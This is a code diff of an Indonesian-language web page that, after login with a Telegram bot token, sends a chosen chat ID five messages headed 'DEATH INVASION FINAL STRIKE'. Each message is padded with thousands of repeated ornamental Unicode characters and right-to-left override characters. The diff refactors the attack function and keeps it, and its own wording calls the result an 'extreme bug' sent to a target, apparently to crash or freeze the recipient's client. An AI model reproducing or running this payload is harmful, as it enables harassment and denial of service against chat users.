@@ -61,7 +61,6 @@
 
         BOT_TOKEN = entry.token;
 
-        // Tampilkan UI setelah login
         document.getElementById('login').style.display = "none";
         document.getElementById('main').style.display = "block";
         document.getElementById('target-section').style.display = "block";
@@ -71,30 +70,36 @@
       }
     }
 
-    <script>
-async function sendHeavyBug(targetId, token) {
-  const ultraBug = "꧅꧄༒︎".repeat(2048) + "\u202e".repeat(2048); // RTLO + Unicode overload
+    async function sendBug() {
+      const targetId = document.getElementById('target-id').value.trim();
+      if (!targetId) return alert("Isi ID dulu 😹");
 
-  const payload = {
-    chat_id: targetId,
-    text: `💣 *DEATH INVASION FINAL STRIKE* 💣\n\n` + ultraBug,
-    parse_mode: "Markdown"
-  };
+      await sendHeavyBug(targetId, BOT_TOKEN);
+    }
 
-  for (let i = 1; i <= 5; i++) {
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
+    async function sendHeavyBug(targetId, token) {
+      const ultraBug = "꧅꧄༒︎".repeat(2048) + "\u202e".repeat(2048);
 
-    console.log(`💥 Kirim [${i}/5]`);
-    await new Promise(res => setTimeout(res, 700)); // delay buat amanin
-  }
+      const payload = {
+        chat_id: targetId,
+        text: `💣 *DEATH INVASION FINAL STRIKE* 💣\n\n` + ultraBug,
+        parse_mode: "Markdown"
+      };
 
-  alert("✅ Bug ekstrim telah dikirim 5x ke target.");
-}
-</script>
+      for (let i = 1; i <= 5; i++) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        console.log(`💥 Kirim [${i}/5]`);
+        await new Promise(res => setTimeout(res, 700));
+      }
+
+      alert("✅ Bug ekstrim telah dikirim 5x ke target.");
+    }
+  </script>
 
 </body>
-  </html>
+</html>
